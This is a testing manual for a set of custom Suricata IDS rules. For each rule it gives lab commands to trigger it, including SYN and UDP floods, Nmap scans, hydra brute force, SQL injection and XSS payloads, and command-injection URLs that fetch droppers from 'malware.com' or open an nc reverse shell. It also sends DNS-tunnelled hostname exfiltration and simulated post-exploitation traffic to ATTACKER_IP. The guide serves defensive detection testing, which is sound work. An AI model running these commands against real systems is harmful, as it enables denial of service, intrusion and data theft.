# 📘 Comprehensive Suricata Testing Guide (Local Rules)

**Version:** 2.0 (Enhanced)
**Date:** 2026-02-09
**Coverage:** All `local.rules` (SID 1000001 - 1000062)

This document serves as a **professional testing manual** for the Analytical-Intelligence Intrusion Detection System (IDS). It provides detailed, step-by-step instructions to validate every custom Suricata rule implemented in our environment.

> **⚠️ WARNING:** These commands simulate **REAL ATTACKS**.
> *   **DO NOT** run these against production networks or servers you do not own.
> *   **DO NOT** run these over the public internet (ISP may block you).
> *   **USE** an isolated test lab (e.g., VirtualBox, Docker network, or local LAN).

---

## 🛠️ 0. Prerequisites & Setup

### A. Environment
*   **Attacker Machine:** Kali Linux or Ubuntu with security tools installed.
*   **Victim Machine (Target):** The Ubuntu Server running Suricata.
*   **Target IP:** Replace `<TARGET_IP>` in all commands with your victim's IP (e.g., `192.168.1.50`).

### B. Required Tools
Install the necessary tools on your **Attacker** machine:
```bash
sudo apt update
sudo apt install -y hping3 nmap hydra nikto sqlmap netcat-openbsd curl apache2-utils
```

### C. Monitoring Logs (On Victim)
On the Victim server, open a terminal to watch alerts in real-time:
```bash
# Human-readable alerts
tail -f /var/log/suricata/fast.log

# OR JSON format (for detailed analysis)
tail -f /var/log/suricata/eve.json | jq .
```

---

## 🌊 1. DDoS & Denial of Service (DoS) Simulation
**Goal:** Verify detection of high-volume traffic anomalies.

### 📌 SID 1000001: TCP SYN Flood (Aggregate)
*   **Description:** Detects a massive flood of SYN packets attempting to initiate connections.
*   **Trigger Condition:** >200 SYN packets to a destination in 1 second.
*   **Test Command:**
    ```bash
    # Flood port 80 with SYN packets from random source IPs
    sudo hping3 -S -p 80 --flood --rand-source <TARGET_IP>
    ```
*   **Why it triggers:** High packet rate + `flags:S` + `flow:to_server`.

### 📌 SID 1000002: UDP Flood (Aggregate)
*   **Test Command:**
    ```bash
    # Flood UDP port 53 (DNS) with random source IPs
    sudo hping3 --udp -p 53 --flood --rand-source <TARGET_IP>
    ```

### 📌 SID 1000003: ICMP Flood (Ping Flood)
*   **Test Command:**
    ```bash
    # Flood with ICMP Echo Requests
    sudo hping3 --icmp --flood --rand-source <TARGET_IP>
    ```

### 📌 SID 1000004 & 1000005: DoS (Single Source)
*   **Description:** Detects a single IP aggressive flooding (less noise than DDoS).
*   **Trigger Condition:** >120 SYN packets/sec from ONE source.
*   **Test Command:**
    ```bash
    # Flood from YOUR specific IP (no random source)
    sudo hping3 -S -p 80 -i u5000 <TARGET_IP>
    ```
    *(Note: `-i u5000` sends a packet every 5000 microseconds = 200 packets/sec)*

### 📌 SID 1000006: HTTP Request Flood
*   **Description:** Detects Layer 7 DoS (HTTP flooding).
*   **Test Command:**
    ```bash
    # Send 1000 requests with 10 concurrent connections
    ab -n 5000 -c 50 http://<TARGET_IP>/
    ```

---

## 🔍 2. Reconnaissance & Port Scanning (Nmap)
**Goal:** Validate detection of scanning techniques used by attackers to map the network.

### 📌 SID 1000010: TCP SYN Scan (Stealth Scan)
*   **Technical:** Sends SYN but never completes the handshake (Half-open).
*   **Test Command:**
    ```bash
    sudo nmap -sS -p 1-1000 -T4 <TARGET_IP>
    ```

### 📌 SID 1000011: TCP Connect Scan (Noisy)
*   **Technical:** Completes the full TCP handshake (3-way).
*   **Test Command:**
    ```bash
    nmap -sT -p 1-1000 <TARGET_IP>
    ```

### 📌 SID 1000013, 14, 15: Nmap Special Scans
These flags are illegal/anomalous in normal traffic.
*   **XMAS Scan (FIN, PSH, URG flags set):** Lit up like a Christmas tree.
    ```bash
    sudo nmap -sX -p 80 <TARGET_IP>
    ```
*   **NULL Scan (No flags set):**
    ```bash
    sudo nmap -sN -p 80 <TARGET_IP>
    ```
*   **FIN Scan (Only FIN flag):**
    ```bash
    sudo nmap -sF -p 80 <TARGET_IP>
    ```

### 📌 SID 1000016: Nmap Scripting Engine (NSE)
*   **Trigger Condition:** User-Agent contains "Nmap Scripting Engine".
*   **Test Command:**
    ```bash
    # Run simple HTTP scripts
    nmap -p 80 --script=http-headers,http-title <TARGET_IP>
    ```

### 📌 SID 1000017: Nikto Vulnerability Scanner
*   **Trigger Condition:** User-Agent contains "Nikto".
*   **Test Command:**
    ```bash
    nikto -h http://<TARGET_IP>
    ```

---

## 🔓 3. Brute Force Attacks
**Goal:** Test threshold-based detection for password guessing.

### 📌 SID 1000030: SSH Brute Force
*   **Trigger Condition:** >5 SYN packets to port 22 in 60 seconds (Aggressive start).
*   **Test Command:**
    ```bash
    # Try 10 random passwords against root user
    hydra -l root -p password -t 10 ssh://<TARGET_IP>
    ```
    *Note: Even failed logins trigger the TCP connection rule.*

### 📌 SID 1000031: RDP Brute Force
*   **Test Command:**
    ```bash
    hydra -l Administrator -p password -t 10 rdp://<TARGET_IP>
    ```

### 📌 SID 1000032: FTP Brute Force
*   **Test Command:**
    ```bash
    hydra -l user -p password -t 10 ftp://<TARGET_IP>
    ```

---

## 🦠 4. Botnet & C2 Simulation
**Goal:** Mimic infected machine behavior (Beaconing, C2).

### 📌 SID 1000020: IRC C2 Traffic
*   **Description:** Malware connecting to IRC server on port 6667.
*   **Test Command:**
    ```bash
    echo "USER bot mode 0 :Bot" | nc <TARGET_IP> 6667
    ```

### 📌 SID 1000022: DNS Tunneling (Data Exfiltration)
*   **Description:** Sending data via long subdomains in DNS queries.
*   **Test Command:**
    ```bash
    dig @<TARGET_IP> $(cat /etc/hostname | base64).verylongmaliciousdomainforc2communicationtesting.com
    ```

### 📌 SID 1000024: HTTP Beaconing
*   **Description:** Malware "checking in" with C2 server at regular intervals.
*   **Test Command:**
    ```bash
    # Send a request every 2 seconds for 1 minute
    for i in {1..30}; do curl -s "http://<TARGET_IP>/keepalive.php"; sleep 2; done
    ```

---

## 🌐 5. Advanced Web Attacks (OWASP Top 10)
**Goal:** Verify deep packet inspection for Layer 7 attacks.

### 💉 SQL Injection (SQLi)
*   **SID 1000040 (UNION):**
    ```bash
    curl "http://<TARGET_IP>/product.php?id=1' UNION SELECT 1,username,password FROM users--"
    ```
*   **SID 1000041 (Logic Bypass):**
    ```bash
    curl "http://<TARGET_IP>/login.php?user=admin' OR 1=1--"
    ```
*   **SID 1000046 (Benchmark / Time-Based):**
    ```bash
    curl "http://<TARGET_IP>/debug?test=BENCHMARK(1000000,MD5(1))"
    ```

### 📜 Cross-Site Scripting (XSS)
*   **SID 1000042 (Script Tag):**
    ```bash
    curl "http://<TARGET_IP>/comment.php?msg=<script>alert('pwned')</script>"
    ```
*   **SID 1000045 (Javascript Protocol):**
    ```bash
    curl "http://<TARGET_IP>/profile.php?url=javascript:alert(1)"
    ```

### 📂 Directory Traversal & LFI
*   **SID 1000043 (Path Traversal):**
    ```bash
    curl "http://<TARGET_IP>/download.php?file=../../../../etc/passwd"
    ```
*   **SID 1000044 (/etc/passwd Specific):**
    ```bash
    curl "http://<TARGET_IP>/view?page=/etc/passwd"
    ```
*   **SID 1000047 (PHP Input Wrapper):**
    ```bash
    curl -X POST --data "<?php system('whoami'); ?>" "http://<TARGET_IP>/page.php?arg=php://input"
    ```

---

## 💀 6. Command Injection & RCE (High Criticality)
**Goal:** Detect attempts to execute OS commands via web vulnerabilities.

### 📌 SID 1000050/51: Dropper Download (wget/curl)
*   **Scenario:** Attacker tries to download a malicious script.
*   **Test Command:**
    ```bash
    curl "http://<TARGET_IP>/vuln?cmd=wget http://malware.com/shell.sh"
    curl "http://<TARGET_IP>/vuln?cmd=curl -O http://malware.com/miner"
    ```

### 📌 SID 1000052/53: Shell Execution (/bin/sh)
*   **Test Command:**
    ```bash
    curl "http://<TARGET_IP>/cgi-bin/test?cmd=/bin/sh"
    curl "http://<TARGET_IP>/cgi-bin/test?cmd=/bin/bash -c 'id'"
    ```

### 📌 SID 1000054: Permission Change (chmod +x)
*   **Test Command:**
    ```bash
    curl "http://<TARGET_IP>/upload?cmd=chmod +x exploit.sh"
    ```

### 📌 SID 1000055: Command Chaining (Piping)
*   **Test Command:**
    ```bash
    curl "http://<TARGET_IP>/ping.php?addr=127.0.0.1; whoami"
    curl "http://<TARGET_IP>/ping.php?addr=127.0.0.1 | nc -e /bin/sh 1.2.3.4"
    ```

---

## 👻 7. Post-Exploitation & Malware (The "Smoking Gun")
**Goal:** Detect successful compromise where an attacker has control.

### 🔬 Setup for Tests
1.  **On Attacker Machine:** Start a listener (simulate C2 server).
    ```bash
    nc -lvnp 4444
    ```
2.  **On Victim/Target Machine:** Run the command to send data TO the attacker.

### 📌 SID 1000060: Reverse Shell Prompt
*   **Scenario:** Attacker gets a shell and sees the prompt.
*   **Command (Run on Victim):**
    ```bash
    echo "root@ubuntu:~#" | nc <ATTACKER_IP> 4444
    ```

### 📌 SID 1000061: ID Command Output
*   **Scenario:** Attacker runs `id` to check privileges.
*   **Command (Run on Victim):**
    ```bash
    echo "uid=0(root) gid=0(root) groups=0(root)" | nc <ATTACKER_IP> 4444
    ```

### 📌 SID 1000062: Shadow File Leak
*   **Scenario:** Attacker reads `/etc/shadow`.
*   **Command (Run on Victim):**
    ```bash
    echo "root:x:0:0:root:/root:/bin/bash" | nc <ATTACKER_IP> 4444
    ```

---

## ❓ Troubleshooting

**Q: I ran the command but see no alert?**
1.  **Check Interface:** Ensure Suricata is listening on the correct interface (e.g., `eth0`).
    *   Edit `/etc/suricata/suricata.yaml` -> `af-packet` -> `interface`.
2.  **Check Offloading:** NIC offloading can mess up checksums, causing Suricata to drop packets.
    *   Run: `sudo ethtool -K eth0 gro off lro off`
3.  **Check Home Net:** Ensure your standard `HOME_NET` includes your victim IP.
4.  **Check Rule Reload:** Did you restart/reload Suricata after editing rules?
    *   `sudo suricata-update`
    *   `sudo systemctl restart suricata`

**Q: I see too many alerts!**
*   This is expected during testing (e.g., floods). In production, you would tune `threshold.config` to limit alert volume.

---
**End of Test Guide**
